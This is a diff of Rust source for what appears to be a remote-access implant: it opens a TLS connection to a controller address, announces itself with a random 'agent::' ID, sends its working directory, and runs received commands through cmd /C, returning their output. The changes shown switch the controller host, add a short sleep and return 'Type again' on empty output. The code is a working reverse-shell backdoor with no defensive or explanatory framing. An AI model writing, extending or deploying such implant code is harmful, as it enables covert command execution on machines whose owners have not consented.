@@ -91,8 +91,8 @@ fn mind_reader_sectioid( mindto_read:&str,windows_shell: &str) -> Vec<u8>  {
                 .expect("failed to execute process")
                
           },
-          Windows_shell => {
-                Command::new(Windows_shell)
+          windows_shell => {
+                Command::new(windows_shell)
                 .args(["/C ", mindto_read])
                 .output()
                 .expect("failed to execute process")
@@ -110,8 +110,9 @@ fn mind_reader_sectioid( mindto_read:&str,windows_shell: &str) -> Vec<u8>  {
                 .output()
                 .expect("failed to execute process")
     };
-    
-    return output.stdout;
+    let mut out=output.stdout;
+    if out.is_empty(){out="Type again".as_bytes().to_vec()}
+    return out;
 }
 //get process_name
 fn get_exec_name() -> Option<String> {
@@ -129,18 +130,20 @@ fn main() {
     .build()
     .unwrap();
         //.build().expect("Failed to create TLS connector");
-    let  stream = TcpStream::connect("192.168.2.6:5001").expect("Failed to connect to server");
-    let mut tls = tls_builder.connect("192.168.2.6", stream).expect("Failed to create TLS stream");
+    let  stream = TcpStream::connect("127.0.0.1:5001").expect("Failed to connect to server");
+    let mut tls = tls_builder.connect("127.0.0.1", stream).expect("Failed to create TLS stream");
 
     let mut muton = [0 as u8; 524288];
     let mut windows_shell="cmd";
     //tls.write_all(current_dir().as_bytes());
-    let mut id =(("agent " ).to_string())+&(generate_string(15).to_string());
-
-
+    let mut id =(("agent::" ).to_string())+&(generate_string(15).to_string()); // cgange id later
+    let ten_millis = time::Duration::from_millis(100);
+    thread::sleep(ten_millis);
     loop {
-        tls.write_all(current_dir().as_bytes());
+        
         tls.write_all((id).as_bytes());
+        tls.write_all(current_dir().as_bytes());
+       
         
         //print on severside the working directory
 
